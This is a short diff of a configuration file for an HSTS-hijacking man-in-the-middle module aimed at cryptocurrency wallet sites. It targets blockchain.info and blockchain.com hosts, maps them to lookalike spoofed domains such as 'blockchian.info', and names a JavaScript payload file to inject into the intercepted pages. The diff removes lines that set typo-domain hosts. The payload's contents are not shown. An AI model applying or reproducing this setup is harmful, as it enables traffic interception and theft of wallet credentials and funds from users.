@@ -20,12 +20,6 @@ set hstshijack.wallets.targethosts           blockchain.info,*.blockchain.info,b
 # Choose your replacement hostnames for each target hostname you have chosen (comma separated, wildcard allowed)
 set hstshijack.wallets.replacementhosts      blockchian.info,*.blockchian.info,blockchian.com,*.blockchian.com
 
-# Choose hostnames with potential typos that can be used as your replacement hostnames (comma separated, wildcard allowed)
-set hstshijack.wallets.typohosts             bolckchain.info,blokcchain.info,*.bolckchain.info,*.blokcchain.info
-
-# Choose your replacement hostname for each typo you have chosen (comma separated, wildcard allowed)
-set hstshijack.wallets.typoreplacementhosts  blockchian.info,blockchian.info,*.blockchian.info,*.blockchian.info
-
 # Choose path of javascript file which will be injected into responses from each targeted host
 set hstshijack.wallets.payloadpath           /root/caplets_dev/hstshijack/blockchain.info/patch.js
 
